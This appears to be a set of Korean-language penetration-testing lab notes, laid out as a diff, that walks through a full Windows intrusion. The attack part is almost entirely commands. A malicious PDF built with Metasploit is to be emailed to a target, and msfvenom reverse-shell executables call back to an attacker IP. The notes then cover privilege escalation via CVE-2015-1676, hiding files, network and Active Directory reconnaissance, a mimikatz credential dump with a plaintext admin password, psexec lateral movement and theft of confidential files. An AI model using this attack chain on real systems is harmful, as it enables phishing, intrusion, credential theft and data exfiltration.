@@ -1,0 +1,175 @@
+실습 1. 악성 파일 만들기
+[Attacker] - Kali
+# sudo su
+# msfconsole
+
+msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe
+> set payload windows/meterpreter/reverse_tcp
+> set lhost 121.34.43.137(kali's ip)
+> set lport 443
+> exploit
+
+이 단계를 마치면 evil.pdf가 생성함. 이 파일을 가지고 원격조정할거임(악성메일)
+
+Target에게 메일 보냄
+
+[Attack PC]
+> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set lhost 121.34.43.137(kali's ip)
+> set lport 443
+> exploit 
+→ Target이 첨부된 악성파일을 실행하면 sessions을 연결 할 수 있음(shell 동작 가능)
+
+> show sessions
+> sessions -i [세션ID]
+
+meterpreter> getuid
+> getprivs
+> shell → 윈도우 shell 조작 가능
+
+msfvenom : exe 파일이나 쉘코드를 생성하고 그 안에 원하는 기능을 주입할 수 있음
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=121.34.43.137 lport=8080 -f exe -o rt.exe
+
+-p : payload
+-f : 파일형식
+-o : 저장위치
+-a : 아키텍쳐
+-e : 인코딩
+
+악성코드 업로드(Establish Foothold)
+meterpreter> upload /tools/tai32.exe c:\\windows\\temp\\tai32.exe ※tai32.exe WINAPI를 후킹함(CVE-2015-1676(tai32.exe의 취약점)). 
+상승권한 후 rt.exe(reverse_tcp를 수행하는 프로그램)를 실행 
+> upload /tools/rt.exe c:\\windows\\temp\\rt.exe
+
+** Dobney System 권한을 위한 핸들러 생성
+
+#msfconsole
+
+> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set lhost 121.34.43.137
+> set lport 8080
+> exploit
+
+Dobney-User 터미널
+
+meterpreter> shell
+
+c:\windows\temp> tai32.exe
+
+시스템 권한 획득 성공
+
+** 악성코드 업로드
+mimikatz
+arp-ping
+plink
+PortQry
+PsExec
+win_srv_add
+
+attrib +H rt.exe
+
+내부 정찰 스캔 1 - arp 스캔
+192.168.12.~~~~ ping날려서 응답 온것 기록
+192.168.12.1
+192.168.12.2
+192.168.12.50
+192.168.12.100
+
+내부 정찰 스캔 2 - 포트 스캔
+c:\windows\temp> PortQry -n [대상IP] -o 21,22,23,25,80,139,443,445,3380,3389,8080
+
+내부 정찰 스캔 3 - AD(Active Directory) 환경 여부 조사
+c:\windows\temp> net group "domain computer" /domain
+
+c:\windows\temp> net group "domain users" /domain
+
+c:\windows\temp> net user "altair" /domain
+
+c:\windows\temp> net share
+
+c:\windows\temp> net view
+
+
+
+
+
+Hands-On) 크레덴셜 확보
+
+Step 1. 미미카츠 실행
+[Dobney-system]
+windows\temp> mimikatz.exe
+
+step 2. 권한 요청
+> privilege::debug
+
+LSASS 프로세스에 접근하기 위해 OS에 권한 요청
+
+Step 3. Sekurlsa 모듈 실행
+- 메모리상에 있는 암호화된 계정, 도메인, 패스워드 등을 확보
+-LSASS 프로세스에 접근해서 대칭키를 확보
+- 이를 통해 암호화된 정보를 복호화
+
+> sekurlsa::logonpasswords
+
+administrator // Do메인Server12!@
+
+> exit
+
+Hands-On) Altair-PC에 접근 1 - Cmdkey 등록
+- cmdkey는 저장된 사용자 이름 및 암호관련 정보
+
+Step 1. Cmdkey 등록
+[Dobney-System]
+c:\windows\temp> cmdkey /add:altair-pc.coresec.com /user:administrator /pass:DoapdlsServer12!@
+
+Step 2. Dobney-PC에 공유 폴더 (C:\WINDOWS) 마운트
+
+> NET USE T: \\altair-pc.coresec.com\admin$
+> net use
+
+Hands-On) Altair-PC에 접근2 - 리버스 커넥션
+
+Step 1. RT 생성
+Altair와 새로운 리버스 커넥션을 맺을 rt_altair.exe를 생성, 이때 lport는 기존(8080)과 다른 8181
+
+# msfvenom -p windows/meterpreter/reverse_tcp lhost=121.34.43.137 lport=8181 -f exe -o rt_altair.exe
+
+Step 2. Altair에서 오는 세션 Handler 생성
+
+#msfconsole
+msf> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set lhost 121.34.43.137
+> set lport 8181
+> exploit
+
+Step 3. rt.exe를 Altair-PC에 업로드
+
+meterpreter> upload /tools/rt_altair.exe t:\\temp\\rt_altair.exe
+
+Step 4. rt_altair.exe 원격 실행
+meterpreter> shell
+c:\windows\temp> psexec -accepteula \\altair-pc.coresec.com -s -d cmd.exe /c "c:\windows\tempt\rt_altair.exe"
+
+[8181 handler]
+Step 5. Altair-PC 시스템 권한 획득
+
+"Step 2"에서 생성했던 handler에서 세션 연결 확인
+
+Hands-On) Altair-PC 조사
+
+Step 1. 추측 가능한 주요 단어 검색
+[Altair-PC]
+meterpreter> shell
+c:\windows\system32> dir /S C:\"*confidential*"
+
+Step 2. 해당 경로로 이동
+> cd "c:\..."
+
+Step 3. accounts.txt 확인
+> type accounts.txt
+
+Step 4. 해당 파일 다운로드
